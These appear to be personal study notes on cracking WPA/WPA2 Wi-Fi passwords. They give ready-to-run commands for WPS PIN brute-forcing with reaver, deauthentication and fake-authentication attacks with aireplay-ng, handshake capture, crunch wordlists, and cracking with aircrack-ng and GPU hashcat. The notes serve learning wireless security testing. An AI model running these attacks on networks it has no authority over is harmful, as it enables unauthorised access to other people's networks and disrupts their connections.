# Cracking the password of AP secured with WPA/WPA2

## WPS
- feature which can be enabled on WPA (for more security, don't enable)
- allows devices to connect without password
- authentication is done only by 8 digit pin
- Push Button Authentication (PBA)
  - Feature, where button needs to be pressed on router to make automatic connection

### Exploit WPS
- If PBA is activated, this won't work
- First enable monitoring mode as on 01_network_basics

```bash
wash --interface wlan0 # get all the networks that use WPS (mon0 is in monitor mode)
```

- now brute force the network password with `reaver`
    - -vvv is for showing as much information as possible
    - --no-associate is to not associate with target network, it is better to do it manually

```bash
reaver --bssid B0:95:75:42:26:E2 --channel 6 --interface wlan0 -vvv --no-associate
``` 

```bash
aireplay-ng --fakeauth 30 -a B0:95:75:42:27:E4 -h 5C:62:8B:76:74:1F wlan0 # associate with network (to not get ignored by network)
```

## Breaking WPA handshake
- Packets contain only data (no key or IV), therefor only handshake packets are useful

### Capturing handshake in WPA communication
- Capture handshake:
  - to speedup the process of capturing handshake, Deauthentication attack from 02_network_basics can be used.
```bash
airodump-ng --bssid B0:95:75:42:27:E3 --channel 5 --write wpa_hanshake wlan0 
# capture all the packets on network, if handshake is capture, airodump-ng will display the information
# use parameter "--band a" to capture only on 5GHz

aireplay-ng --deauth 4 -a B0:95:75:42:27:E3 -c 82:B2:61:31:A6:9B -D wlan0 # deauth attack
```

### Create wordlist using crunch
```bash
crunch [min] [max] [characters] -t [pattern] -o [Filename]
```

### Crack password from handshake with wordlist
- aircrack-ng unpack the handshake will be used to extract useful information from the handshake
- it will take password from word list and generate MIC (message integrity code)
- then it will compare MIC in the handshake with generated MIC

```bash
aircrack-ng test-01.cap -w crunch.txt
```
- wpa_handshake-01.cap : handshake file
- -w test.txt : our wordlist

### Crack password with GPU on Windows
- on 100 000 000 combination it came from 4,5 hours on AMD Ryzen 5 7600X to under 2 minutes on Nvidia rtx 3080
- download hashcat and all the necessary GPU drivers on their page (for Nvidia latest drivers and cuda tollkit)
- somehow hashcat doesn't work for me if no run in its location, probably didn't use relative paths
- first convert the captured handshake in .cap file into hashcat format on their webpage 

```bash
hashcat.exe -d 1 -m 22000 -w 3 --status -a 0 --hwmon-disable wpa_hanshake-01.hc22000 crunch.txt
```
- `-d` select device (for me 3080 was device one), to get all the devices run `hashcat.exe -I`
- `-m` hash type, currently wpa handshake is 22000
- `-w` workload profile => 1 Low, 2 Default, 3 High, 4 Headless
- `--status` enable automatic update of the status screen 
- `-a` attack mode => 0 Straight
- `--hwmon-disable` Disable temperature and fan speed reads and triggers (When graphic cards starts fans on 100% it triggers to stop the hashcat on my card, which happens right after starting the hashcat..)
- `wpa_hanshake-01.hc22000` converted cap
- `crunch.txt` wordlist


